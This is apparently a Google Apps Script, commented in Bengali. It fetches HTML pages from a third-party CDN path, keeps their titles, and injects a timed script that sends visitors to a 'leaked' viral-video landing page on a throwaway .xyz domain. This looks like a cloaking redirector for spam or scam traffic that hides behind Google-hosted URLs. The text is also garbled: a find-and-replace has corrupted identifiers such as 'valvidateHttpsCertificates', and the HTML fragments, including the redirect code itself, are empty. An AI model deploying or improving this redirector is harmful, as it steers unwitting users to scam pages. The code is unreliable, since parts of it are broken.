// ============================================================ // CONFIG // ============================================================ // HTML files যে folder-এ আছে const HTML_BASE_URL = "https://forms.macromedia.de/cdn/files/"; // কত milliseconds পরে redirect হবে // 2000 = 2 seconds const REDIRECT_DELAY = 2000; // Redirect / Landing page const LANDING_URL = "https://viralvvidz.xyz/leaked/"; // ============================================================ // MAIN // ============================================================ function doGet(e) { // ---------------------------------------------------------- // ?vid=ABC123 // ---------------------------------------------------------- const vid = e && e.parameter && e.parameter.vid ? String(e.parameter.vid).trim() : ""; // ---------------------------------------------------------- // vid MISSING // ---------------------------------------------------------- if (!vid) { return createErrorPage( "vid missing", "Please provvide an vid." ); } // ---------------------------------------------------------- // SECURITY VALvidATION // ---------------------------------------------------------- // Only: // A-Z // a-z // 0-9 // _ // - if (!/^[a-zA-Z0-9_-]+$/.test(vid)) { return createErrorPage( "Invalvid vid", "The supplied vid contains invalvid characters." ); } // ---------------------------------------------------------- // BUILD HTML URL // ---------------------------------------------------------- const htmlUrl = HTML_BASE_URL + encodeURIComponent(vid) + ".html"; try { // -------------------------------------------------------- // FETCH HTML // -------------------------------------------------------- const response = UrlFetchApp.fetch( htmlUrl, { method: "get", muteHttpExceptions: true, followRedirects: true, valvidateHttpsCertificates: true } ); const statusCode = response.getResponseCode(); // -------------------------------------------------------- // FILE NOT FOUND / HTTP ERROR // -------------------------------------------------------- if (statusCode !== 200) { return createErrorPage( "Page not found", "File " + escapeHtml(vid + ".html") + " could not be loaded." ); } // -------------------------------------------------------- // GET HTML // -------------------------------------------------------- let html = response.getContentText("UTF-8"); // -------------------------------------------------------- // EXTRACT ORIGINAL TITLE // -------------------------------------------------------- let title = extractTitle(html); // Fallback title if (!title) { title = vid; } // -------------------------------------------------------- // ADD REDIRECT // -------------------------------------------------------- html = addRedirect( html, LANDING_URL, REDIRECT_DELAY ); // -------------------------------------------------------- // RETURN HTML // -------------------------------------------------------- return HtmlService .createHtmlOutput(html) .setTitle(title) .setXFrameOptionsMode( HtmlService.XFrameOptionsMode.ALLOWALL ); } catch (error) { // -------------------------------------------------------- // ERROR // -------------------------------------------------------- return createErrorPage( "Error", escapeHtml( error && error.message ? error.message : "Unknown error" ) ); } } // ============================================================ // EXTRACT TITLE // ============================================================ function extractTitle(html) { if (!html) { return ""; } const match = html.match( /]*>([\s\S]*?)<\/title>/i ); if (!match) { return ""; } return match[1] // Remove HTML tags .replace(/<[^>]*>/g, "") // Decode common HTML entities .replace(/&/gi, "&") .replace(/"/gi, '"') .replace(/'/gi, "'") .replace(/</gi, "<") .replace(/>/gi, ">") // Normalize spaces .replace(/\s+/g, " ") .trim(); } // ============================================================ // ADD REDIRECT // ============================================================ function addRedirect( html, landingUrl, delay ) { // ---------------------------------------------------------- // Escape URL for JavaScript string // ---------------------------------------------------------- const safeUrl = String(landingUrl) .replace(/\\/g, "\\\\") .replace(/"/g, '\\"'); // ---------------------------------------------------------- // Redirect script // ---------------------------------------------------------- const redirectCode = ''; // ---------------------------------------------------------- // Insert before // ---------------------------------------------------------- if (/<\/body\s*>/i.test(html)) { return html.replace( /<\/body\s*>/i, redirectCode + "" ); } // ---------------------------------------------------------- // No // ---------------------------------------------------------- return html + redirectCode; } // ============================================================ // ERROR PAGE // ============================================================ function createErrorPage( title, message ) { const html = '' + '' + '' + '' + '' + '' + escapeHtml(title) + '' + '' + '' + '

' + escapeHtml(title) + '

' + '

' + message + '

' + '' + ''; return HtmlService .createHtmlOutput(html) .setTitle(title) .setXFrameOptionsMode( HtmlService.XFrameOptionsMode.ALLOWALL ); } // ============================================================ // HTML ESCAPE // ============================================================ function escapeHtml(text) { return String(text) .replace(/&/g, "&") .replace(//g, ">") .replace(/"/g, """) .replace(/'/g, "'"); }
